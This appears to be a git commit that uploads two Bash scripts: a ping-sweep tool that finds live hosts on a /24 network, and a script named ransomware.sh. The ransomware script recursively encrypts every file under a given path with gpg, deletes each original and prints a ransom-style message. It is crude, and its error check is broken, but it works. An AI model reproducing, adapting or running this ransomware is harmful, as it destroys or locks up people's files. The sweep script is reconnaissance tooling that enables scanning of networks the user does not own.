85658cb7e7998798e772ca8dcdbe90ddba660017
Marios K. Pappas <66968346+Pri3st@users.noreply.github.com>
2022-07-25 09:18:11 +0300

    Add files via upload

---
+++ pingsweep.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+# Display Help and Exit
+if [ "$1" == "-h" ]
+then
+	echo "Pingsweep is a simple script to scan /24 networks."
+	echo "Syntax: ./ipsweep.sh xxx.xxx.xxx"
+	exit
+fi
+
+if [ "$1" == "" ]
+then
+    echo "You forgot an IP address!"
+    echo "Syntax: ./ipsweep.sh 192.168.1"
+
+else
+    for ip in `seq 1 254`; do
+    ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
+    done
+fi
---
+++ ransomware.sh
@@ -0,0 +1,90 @@
+#!/bin/bash
+
+#In this line we check that an
+#argument is provided or not
+if [ -z "$1" ]; then
+echo "No file provided" >&2
+exit 1
+fi
+
+#reading the password which would
+#be used for encryption
+read -p "Enter the password" pass
+
+function func()
+{
+file_name=$1
+
+#checking if the provided
+#argument is a directory
+if [ -d `realpath $file_name` ]; then
+
+#going to the location
+#of the directory
+cd `realpath $file_name`
+
+#saving the output of the
+#“ls | uniq” in an array
+array=(`ls | uniq `)	
+
+#storing the length of the
+#array in a variable
+len=${#array[*]}	
+i=0
+
+#looping through all the
+#indices of the array
+while [ $i -lt $len ]; do
+
+#displaying the file in
+#the index right now
+echo "${array[$i]}"
+
+#recursively calling the function
+func ${array[$i]}
+
+#increasing the counter
+let i++
+
+done
+fi
+
+#checking if the argument is a file
+if [ -f `realpath $file_name` ]; then
+
+#encrypting the file with the given password
+#and storing the return value of the gpg
+#in a variable
+test= echo $pass | gpg -c --batch --yes --passphrase-fd 0 $file_name
+
+#checking if the gpg
+#executed properly or not
+if [ "$test" == "1" ]; then
+
+#writing to the standard error
+echo "Bad signature: gpg not executed properly" >&2
+exit 1
+
+#checking if the gpg
+#executed properly or not
+elif [ "$test" == "2" ]; then
+
+#writing to the standard error
+echo "unexpected error: gpg not executed properly" >&2
+exit 1
+
+else
+
+#deleting the original file
+rm $file_name
+
+#displaying the gpg created
+echo " $file_name.gpg "	
+fi
+fi
+}
+func $1
+
+#echo Ransom Message
+echo "Your files have been encrypted."
+
